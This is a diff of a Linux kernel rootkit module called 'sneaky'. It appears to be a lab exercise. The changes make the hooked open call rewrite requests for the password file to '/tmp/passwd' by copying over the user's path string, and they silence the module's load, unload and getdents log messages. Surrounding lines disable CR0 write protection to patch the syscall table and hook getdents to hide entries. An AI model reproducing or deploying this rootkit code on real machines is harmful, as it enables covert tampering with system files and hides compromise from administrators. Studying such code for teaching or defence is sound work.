@@ -71,7 +71,13 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   size_t passwd_size = sizeof(PASSWD)-1;
   if (strncmp(pathname, PASSWD, passwd_size)==0) {
+    printk("These are the same!\n");
     const char * fake = "/tmp/passwd";
+    char * mychar = (char *) pathname;
+    printk("My original string is:%s!\n", pathname);
+    unsigned long result = copy_to_user((void __user *)mychar, (const void*) fake, 12);
+    printk("My new string is:%s!\n", pathname);
+    printk("My result is:%lu!\n", result);
     //copy fake string to pathname
   }
   
@@ -86,7 +92,7 @@ asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, 
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-  printk(KERN_INFO "Sneaky Get DENTS!\n");
+  //printk(KERN_INFO "Sneaky Get DENTS!\n");
   
   //initial Direct structure
   struct linux_dirent *dir;
@@ -154,8 +160,8 @@ static int initialize_sneaky_module(void)
   struct page *page_ptr;
 
   //See /var/log/syslog for kernel print output
-  printk(KERN_ALERT "Sneaky module being loaded.\n");
-  printk(KERN_ALERT "Process ID is: %i!\n", pid);
+  // printk(KERN_ALERT "Sneaky module being loaded.\n");
+  //printk(KERN_ALERT "Process ID is: %i!\n", pid);
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   //Get a pointer to the virtual page containing the address
@@ -187,7 +193,7 @@ static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -210,7 +216,7 @@ static void exit_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  printk(KERN_INFO "Cleaning up module.\n");
+  //printk(KERN_INFO "Cleaning up module.\n");
 }  
 
 //allows renaming of cleanup and init functions
